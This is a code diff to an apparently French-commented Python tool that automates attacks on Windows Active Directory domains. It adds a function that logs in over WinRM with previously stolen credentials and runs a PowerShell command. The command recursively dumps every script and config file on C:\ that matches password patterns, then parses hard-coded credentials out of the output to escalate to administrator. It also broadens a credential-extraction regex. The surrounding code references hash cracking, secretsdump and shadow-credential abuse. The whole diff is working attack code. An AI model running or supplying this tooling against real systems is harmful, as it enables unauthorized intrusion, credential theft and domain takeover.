@@ -893,8 +893,9 @@ def _parse_creds_from_bytes(data):
     for t in texts:
         for m in re.finditer(r"([A-Za-z0-9._-]{1,40})@[\w.-]+:(\S{2,60})", t):          # user@domaine:pass
             found.append((m.group(1), m.group(2)))
-        for m in re.finditer(r"(?is)user(?:name)?\s*[:=]\s*([A-Za-z0-9._\\-]{1,40})"
-                             r".{0,40}?pass(?:word)?\s*[:=]\s*(\S{2,60})", t):            # user:.. pass:..
+        # user/pass (gere les guillemets et $username=..$password= des scripts PowerShell)
+        for m in re.finditer(r"""(?is)user(?:name)?\s*[:=]\s*['"]?([A-Za-z0-9._\\@-]{1,40})['"]?"""
+                             r""".{0,80}?pass(?:word)?\s*[:=]\s*['"]?([^'"\s]{2,60})""", t):
             found.append((m.group(1).split("\\")[-1], m.group(2)))
         for m in re.finditer(r'cpassword\s*[:=]\s*["\']?([A-Za-z0-9+/=]{16,})', t):       # GPP cpassword
             found.append(("GPP-cpassword", m.group(1)))
@@ -1536,6 +1537,8 @@ def phase4_escalation(hosts, args, state):
     abuse_acl_paths(args, state, dc)
     # crack immediat des hashes obtenus (ex: targeted kerberoast -> JERRI) -> nouveau cred
     crack_hashes(args, state)
+    # chasse de creds SUR LE DISQUE via WinRM (ex: syncer.ps1 -> SANFORD) -> Administrator
+    hunt_disk_creds(args, state, dc)
 
     # 2) cartographie des creds -> hotes (admin local ?) + RCE + secretsdump
     nxc = nxc_bin()
@@ -1927,6 +1930,40 @@ def win_exec(args, state, host, proto="smb", cmd="whoami"):
         add_finding(state, "INFO", f"Shell : evil-winrm -i {host} -u {args.user} {idflag}", host=host)
     else:
         add_finding(state, "INFO", f"Shell : wmiexec.py {args.domain}/{args.user}@{host} {idflag}", host=host)
+
+# PowerShell : dump le contenu des fichiers texte qui contiennent un motif de creds
+_DISK_PS = ("Get-ChildItem C:\\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs,*.config,*.xml,*.ini,*.txt,*.psd1 "
+            "-ErrorAction SilentlyContinue | Select-String -List -Pattern 'password|passwd|pwd|secret|cred' "
+            "-ErrorAction SilentlyContinue | ForEach-Object { \"=== \" + $_.Path + \" ===\"; "
+            "Get-Content $_.Path -ErrorAction SilentlyContinue }")
+
+def hunt_disk_creds(args, state, dc):
+    """Cherche des creds SUR LE DISQUE via WinRM (-x) : scripts/configs avec mdp en
+    dur (ex: syncer.ps1 -> SANFORD). Ce qu'un scanner classique ne fait pas."""
+    nxc = nxc_bin()
+    if not (nxc and _gate(args)):
+        return
+    tried = state.setdefault("_diskhunt", set())
+    for c in list(state.get("creds", [])):
+        u = (c.get("user") or "")
+        if not u or u.lower() in tried:
+            continue
+        tried.add(u.lower())
+        idflag = ["-H", nt_full(c["hash"])] if c.get("hash") else ["-p", c.get("password") or ""]
+        rc, out, _ = run_cmd([nxc, "winrm", dc, "-u", u] + idflag +
+                             (["-d", args.domain] if args.domain else []) + ["-x", _DISK_PS], 240)
+        if "Pwn3d" not in out and "===" not in out:
+            continue   # pas d'acces WinRM ou rien
+        log(f"{C.GR}[i] Disk hunt via WinRM ({u}) -> analyse des fichiers...{C.X}")
+        for user, pw in _parse_creds_from_bytes(out.encode("utf-8", "ignore")):
+            if user.lower() in ("username", "user", "") or not pw:
+                continue
+            if not any(x.get("user", "").lower() == user.lower() and x.get("password") == pw
+                       for x in state.get("creds", [])):
+                state.setdefault("creds", []).append(
+                    {"user": user, "password": pw, "hash": None, "src": "disk"})
+                add_finding(state, "CRIT", f"Cred sur le disque (via {u}) : {user}:{pw}",
+                            "trouve dans un fichier/script sur C:\\ -> nouvel acces", dc)
 
 def abuse_shadow_credentials(args, state, dc, target):
     """GenericWrite/GenericAll sur un compte -> KeyCredentialLink -> PKINIT -> hash NT."""
